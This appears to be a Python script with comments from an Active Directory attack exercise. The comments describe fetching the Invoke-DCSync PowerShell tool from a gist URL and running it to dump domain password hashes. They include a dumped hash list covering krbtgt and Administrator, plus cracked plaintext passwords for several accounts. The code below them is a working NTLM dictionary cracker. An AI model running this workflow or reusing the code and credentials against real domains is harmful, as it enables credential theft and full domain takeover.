# Dumping the hashes
# Invoke-DCSync (https://gist.githubusercontent.com/monoxgas/9d238accd969550136db/raw/7806cc26744b6025e8f1daf616bc359cb6a11965/Invoke-DCSync.ps1)
# Download the file into AD, then run powershell
# Import-Module .\Invoke-DCSync.ps1
# Invoke-DCSync -PWDumpFormat

# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d595f9d69cdaa9aa6274f2f55ccd1c95:::
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::
# amejj:1103:aad3b435b51404eeaad3b435b51404ee:4d0ca5d019474b46dc3aaa0d614f6cb7:::
# test:1106:aad3b435b51404eeaad3b435b51404ee:7b90c7f506ac8d02e09da33e98ccebe1:::
# sicom:1108:aad3b435b51404eeaad3b435b51404ee:2970c6979c92f4ef378aa24c3bde74cc:::
# meriem:1110:aad3b435b51404eeaad3b435b51404ee:cb455751cbca968bc4dd8e5c88c6a093:::


# import hashlib,binascii

# hash = hashlib.new('md4', clear_password.encode('utf-16le')).digest()
# encoded = binascii.hexlify(hash).decode("utf-8")

# amejj:Mejahdi@123
# test:Tata@2022
# sicom:Tete/21-22
# meriem:2022Mriem!
# Administrator:Admin@123

import hashlib, binascii


hashes = open("AD_password_dump.txt","r").read().split("\n")
wordlist = open("wordlist.txt","r").read().split("\n")

users = {} # initiate users dictionary with hashed passwords
found = {} # initiate users dictionary for cracked passwords

print("username and their passwords hashes")
for i in hashes:
	username = i.split(":")[0]
	password = i.split(":")[3]
	users[username]=password
	# print("{} => {}".format(username,password))
	for clear_password in wordlist:
		encoded = binascii.hexlify(hashlib.new('md4', clear_password.encode('utf-16le')).digest()).decode("utf-8") # generate a NTLM hash 
		if password == encoded:
			found[username]=clear_password

# print(found)
print("************** Password Founds ************** ")
for f in found:
	print("[+] Password found {} ==> {}".format(f,found[f]))

intersection = list(set(list(found.keys())).symmetric_difference(list(users.keys())))
print("************** Password Not Cracked ************** ")
for nf in intersection:
	print("[-] Password not found {} ==> {}".format(nf,users[nf]))
